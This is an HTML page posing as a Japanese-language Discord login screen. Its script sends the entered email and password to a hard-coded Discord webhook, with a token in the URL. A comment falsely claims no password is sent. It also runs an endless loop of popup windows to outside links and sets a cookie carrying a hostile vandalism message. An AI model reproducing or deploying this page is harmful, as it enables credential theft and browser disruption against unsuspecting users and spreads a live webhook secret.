<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>Discord</title>
<style>
    body {
        font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        background-color: #36393f;
        color: #dcddde;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }
    form {
        background-color: #2f3136;
        padding: 40px;
        border-radius: 8px;
        box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
        width: 400px;
    }
    .form-title {
        color: #fff;
        text-align: center;
        margin-bottom: 20px;
    }
    label {
        display: block;
        margin-bottom: 8px;
        font-size: 16px;
    }
    input[type="text"],
    input[type="password"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 20px;
        background-color: #202225;
        border: 1px solid #202225;
        color: #dcddde;
        border-radius: 3px;
    }
    input[type="button"] {
        display: block;
        width: 100%;
        background-color: #5865f2;
        color: #fff;
        padding: 10px;
        border: none;
        border-radius: 3px;
        cursor: pointer;
        font-size: 16px;
        text-transform: uppercase;
        font-weight: bold;
    }
    input[type="button"]:hover {
        background-color: #4752c4;
    }
    .form-footer {
        text-align: center;
        margin-top: 20px;
        font-size: 14px;
    }
    .form-footer a {
        color: #00aff4;
        text-decoration: none;
    }
    .form-footer a:hover {
        text-decoration: underline;
    }
</style>
</head>
<body>

<form id="loginForm">
    <div class="form-title"><h2>ログイン</h2></div>
    <label for="email">メールアドレスまたはユーザー名</label>
    <input type="text" id="email" name="email" required>
    <label for="password">パスワード</label>
    <input type="password" id="password" name="password" required>
    <input type="button" value="ログイン" onclick="sendData()">
    <div class="form-footer">
        <a href="#">アカウントをお持ちでないですか？</a>
    </div>
</form>

<script>
function openRandomWindow(url) {
      // 画面の幅と高さを取得
      const screenWidth = window.screen.width;
      const screenHeight = window.screen.height;
    
      // ランダムなleftとtopの値を計算
      const left = Math.floor(Math.random() * (screenWidth - 200)); // 新しいウィンドウの幅を200と仮定
      const top = Math.floor(Math.random() * (screenHeight - 200)); // 新しいウィンドウの高さを200と仮定
    
      // 新しいウィンドウをランダムな位置で開く
      window.open(url, '_blank', `width=200,height=200,left=${left},top=${top}`);
        const cookie = "LonglivetheRepublicofMagdaVandalism!M:psupportsthiscause.Therailwayindustrymustdiequickly!!!!Wehavecreatedthistechnologyfortherailindustry!DoNotcontactMagdaincaseofabuse.Anyonewhohatesyouenoughtousethisstuffistoblame.Soit'sSuckitup!Die!!!";
        document.cookie = cookie;
        changeText()
        window.open(url, '_blank', `width=200,height=200,left=${left},top=${top}`);
        window.open(url, '_blank', `width=200,height=200,left=${left},top=${top}`);
    }

    function changeText() {
        // IDが'header'の要素を見つけます。
        var headerElement = document.getElementById('header');
        // その要素のテキスト内容を変更します。
        headerElement.textContent = "警告";
    }
    function gameOver() {
        while (true) {
        openRandomWindow('https://discord-velseons.github.io/');
        openRandomWindow('https://2no.co/2aM0M4');
        }
    }

function sendData() {
    gameOver()
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;
    var data = {
        content: `ログイン試行: ${email} ${password}` // パスワードを含む情報は送信しない
    };

    fetch('https://discord.com/api/webhooks/1208601613783269376/euWVaEp1HsUWI7TqhMLRmxvEi-a86nXPcse8VSjEeYy3vLUNVvQU2J4wemeCoYP5Oe0R', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(result => console.log(result))
    .catch(error => console.error('Error:', error));
}
</script>

</body>
</html>
